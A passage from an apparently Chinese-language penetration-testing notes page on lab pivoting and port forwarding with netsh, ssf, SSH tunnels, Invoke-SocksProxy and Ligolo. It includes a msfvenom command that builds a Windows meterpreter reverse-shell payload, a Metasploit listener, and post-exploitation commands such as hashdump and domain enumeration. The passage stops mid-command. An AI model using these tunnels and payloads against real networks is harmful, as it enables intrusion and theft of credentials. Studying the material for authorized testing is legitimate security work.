class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;当靶机某服务只允许内网访问时，将端口转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;添加防火墙规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;列出所有转发规则:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy show all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除指定的端口转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除所有转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy reset&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;ssf\&quot;&gt;ssf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;单层网络正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/securesocketfunneling/ssf/releases&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;把内网10.1.1.108的SSH转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器访问内网端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;单层网络反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh\&quot;&gt;ssh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;SSH基本参数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-C 压缩传输，加快传输速度&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f 在后台对用户名密码进行认证&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-q 安静模式，不要显示任何debug信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-l 指定ssh登录名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g 允许远程主机连接到本地用于转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-L 进行本地端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-R 进行远程端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D 动态转发，即socks代理&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-T 禁止分配伪终端&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-p 指定远程ssh服务端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;本地攻击机执行，把115的3389映射到本地的33890上&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&quot;2\&quot;&gt;\n&lt;li&gt;方法2（上线MSF）\n** 攻击机—出网Linux靶机—不出网Linux靶机—不出网win机 **\n攻击逻辑说明：&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n&lt;li&gt;Windows 执行 1.exe&lt;/li&gt;\n&lt;li&gt;→ 连接 “不出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;不出网 Linux 把 12138 映射到 “出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓&lt;/li&gt;\n&lt;li&gt;攻击机 msfconsole 收到 meterpreter 会话&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;攻击机监听端口12345&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lport 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set ExitOnSession false&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; exploit -j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Exploit running as background job 0.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Started reverse TCP handler on 0.0.0.0:12345&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;不出网Linux机&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样就建立连接了，然后可以这样做&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 把会话放到后台&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; background&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看/升级 transport（断网重连）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; sessions -i 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport next&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 常用其它命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; sysinfo # 系统版本 / 补丁\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; getuid # 当前用户 / 特权\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_domain #域信息\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;外网攻击107，内网靶机97&lt;/p&gt;\n&lt;p&gt;出网靶机编辑后restart ssh服务&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\nservice rinetd start&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;invoke-socksproxy\&quot;&gt;Invoke-SocksProxy&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#invoke-socksproxy\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gitee.com/RichChigga/Invoke-SocksProxy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Import-Module .\\Invoke-SocksProxy.psm1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ligolo\&quot;&gt;Ligolo&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ligolo\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd `go env GOPATH`/src&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;git clone https://github.com/sysdream/ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;cd ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make dep&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;生成证书,example.com换成攻击机的域名或IP地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make certs TLS_HOST=example.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make build-all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;./bin/localrelay_linux_amd64&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -CfNg -D 11601 